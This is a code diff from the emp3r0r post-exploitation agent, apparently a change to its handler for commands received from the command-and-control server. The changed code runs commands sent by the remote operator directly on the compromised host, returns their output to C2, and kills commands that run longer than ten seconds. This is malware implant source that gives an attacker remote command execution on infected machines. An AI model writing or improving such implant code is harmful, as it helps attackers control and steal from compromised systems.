@@ -252,15 +252,12 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 	default:
 		// exec cmd using os/exec normally, sends stdout and stderr back to CC
-		cmd_arg := []string{"-c"}
-		cmd_arg = append(cmd_arg, strings.Join(cmdSlice, " "))
-		cmd := exec.Command(emp3r0r_data.DefaultShell, cmd_arg...)
 		if runtime.GOOS != "linux" {
 			if !strings.HasSuffix(cmdSlice[0], ".exe") {
 				cmdSlice[0] += ".exe"
 			}
-			cmd = exec.Command(cmdSlice[0], cmdSlice[1:]...)
 		}
+		cmd := exec.Command(cmdSlice[0], cmdSlice[1:]...)
 		var out_bytes []byte
 		out_buf := bytes.NewBuffer(out_bytes)
 		cmd.Stdout = out_buf
@@ -279,8 +276,12 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 				for i := 0; i < 10; i++ {
 					time.Sleep(time.Second)
 				}
-				if util.IsPIDAlive(cmd.Process.Pid) && !keep_running {
-					cmd.Process.Kill()
+				if !keep_running {
+					err = cmd.Process.Kill()
+					out = fmt.Sprintf("Killing %d, which has been running for more than 10s, status %v",
+						cmd.Process.Pid, err)
+					sendResponse(out)
+					return
 				}
 			}()
 		}
